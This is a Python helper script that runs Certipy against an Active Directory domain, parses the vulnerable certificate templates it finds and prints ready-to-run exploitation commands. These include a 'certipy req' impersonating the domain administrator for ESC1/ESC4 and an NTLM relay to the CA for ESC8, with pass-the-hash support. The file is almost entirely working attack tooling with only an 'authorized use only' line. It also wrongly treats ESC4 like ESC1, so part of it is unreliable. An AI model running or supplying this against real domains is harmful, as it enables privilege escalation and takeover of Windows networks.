#!/usr/bin/env python3
"""
certipy_esc_assessor.py — Automate an AD CS ESC enumeration pass with Certipy.

This helper wraps `certipy find` (the real `certipy-ad` binary), runs it in JSON
mode, parses the resulting report, and prints a prioritized list of exploitable
ESC findings with the exact follow-on `certipy req` command for ESC1-style cases.

Authorized use only. Run against environments you are permitted to test.

Install the underlying tool first:
    pipx install certipy-ad   # provides the `certipy` binary

Examples:
    python certipy_esc_assessor.py -u attacker@corp.local -p 'Passw0rd!' \
        --dc-ip 10.0.0.100
    python certipy_esc_assessor.py -u attacker@corp.local \
        --hashes :fc525c... --dc-ip 10.0.0.100 --outdir ./loot
"""
import argparse
import glob
import json
import os
import shutil
import subprocess
import sys
import tempfile


def build_find_cmd(args, outdir):
    """Construct the certipy find command line."""
    cmd = ["certipy", "find", "-dc-ip", args.dc_ip, "-json", "-vulnerable"]
    if args.enabled:
        cmd.append("-enabled")
    cmd += ["-u", args.user]
    if args.password:
        cmd += ["-p", args.password]
    elif args.hashes:
        cmd += ["-hashes", args.hashes]
    elif args.kerberos:
        cmd += ["-k", "-no-pass"]
    else:
        sys.exit("[!] Provide -p, --hashes, or -k for authentication.")
    if args.ns:
        cmd += ["-ns", args.ns]
    # certipy writes <timestamp>_Certipy.json into the current working dir
    cmd += ["-output", os.path.join(outdir, "certipy")]
    return cmd


def run_certipy(cmd):
    if shutil.which("certipy") is None:
        sys.exit("[!] 'certipy' not found on PATH. Install with: pipx install certipy-ad")
    print("[*] Running:", " ".join(cmd))
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
    except subprocess.TimeoutExpired:
        sys.exit("[!] certipy find timed out after 600s.")
    if proc.returncode != 0:
        sys.stderr.write(proc.stdout + "\n" + proc.stderr + "\n")
        sys.exit(f"[!] certipy exited with code {proc.returncode}")
    return proc.stdout


def load_report(outdir):
    """Find and load the JSON report certipy produced."""
    candidates = sorted(glob.glob(os.path.join(outdir, "*Certipy.json")) +
                        glob.glob(os.path.join(outdir, "*.json")))
    if not candidates:
        sys.exit("[!] No JSON report found from certipy output.")
    path = candidates[-1]
    print(f"[*] Parsing report: {path}")
    with open(path, "r", encoding="utf-8") as fh:
        return json.load(fh), path


def extract_findings(report):
    """Walk the certipy JSON for templates flagged with [ESCx] vulnerabilities."""
    findings = []
    templates = report.get("Certificate Templates", {})
    if isinstance(templates, dict):
        iterable = templates.values()
    else:
        iterable = templates
    for tpl in iterable:
        vulns = tpl.get("[!] Vulnerabilities") or tpl.get("Vulnerabilities") or {}
        if not vulns:
            continue
        findings.append({
            "template": tpl.get("Template Name") or tpl.get("Name", "?"),
            "ca": (tpl.get("Certificate Authorities") or ["?"])[0]
                  if isinstance(tpl.get("Certificate Authorities"), list)
                  else tpl.get("Certificate Authorities", "?"),
            "vulns": vulns,
        })
    return findings


def suggest_command(args, finding):
    """Produce a ready-to-run req command for ESC1-class findings."""
    if any("ESC1" in k or "ESC4" in k for k in finding["vulns"]):
        auth = f"-p '{args.password}'" if args.password else (
            f"-hashes {args.hashes}" if args.hashes else "-k -no-pass")
        return (f"certipy req -u '{args.user}' {auth} -dc-ip {args.dc_ip} "
                f"-ca '{finding['ca']}' -template '{finding['template']}' "
                f"-upn 'administrator@{args.user.split('@')[-1]}' "
                f"-sid '<TARGET-SID>'")
    if any("ESC8" in k for k in finding["vulns"]):
        return ("certipy relay -target 'http://<CA-FQDN>' -template 'DomainController' "
                "# then coerce a DC to authenticate to your relay host")
    return "# Manual exploitation required — review ESC type above."


def main():
    ap = argparse.ArgumentParser(description="Automate AD CS ESC enumeration with Certipy.")
    ap.add_argument("-u", "--user", required=True, help="UPN, e.g. attacker@corp.local")
    ap.add_argument("-p", "--password", help="Cleartext password")
    ap.add_argument("--hashes", help="LM:NT or :NT hash for pass-the-hash")
    ap.add_argument("-k", "--kerberos", action="store_true", help="Use Kerberos ccache")
    ap.add_argument("--dc-ip", required=True, dest="dc_ip", help="Domain Controller IP")
    ap.add_argument("--ns", help="DNS resolver IP (often the DC)")
    ap.add_argument("--enabled", action="store_true", help="Only enabled templates")
    ap.add_argument("--outdir", default=None, help="Output directory (default: temp)")
    args = ap.parse_args()

    outdir = args.outdir or tempfile.mkdtemp(prefix="certipy_")
    os.makedirs(outdir, exist_ok=True)

    run_certipy(build_find_cmd(args, outdir))
    report, _ = load_report(outdir)
    findings = extract_findings(report)

    if not findings:
        print("[+] No vulnerable templates flagged by Certipy.")
        return

    print(f"\n[+] {len(findings)} vulnerable template(s) found:\n")
    for i, f in enumerate(findings, 1):
        esc_ids = ", ".join(sorted(f["vulns"].keys()))
        print(f"  {i}. Template '{f['template']}' on CA '{f['ca']}'")
        print(f"     Vulnerabilities: {esc_ids}")
        for k, v in f["vulns"].items():
            print(f"       - {k}: {v}")
        print(f"     Suggested next step:\n       {suggest_command(args, f)}\n")


if __name__ == "__main__":
    main()
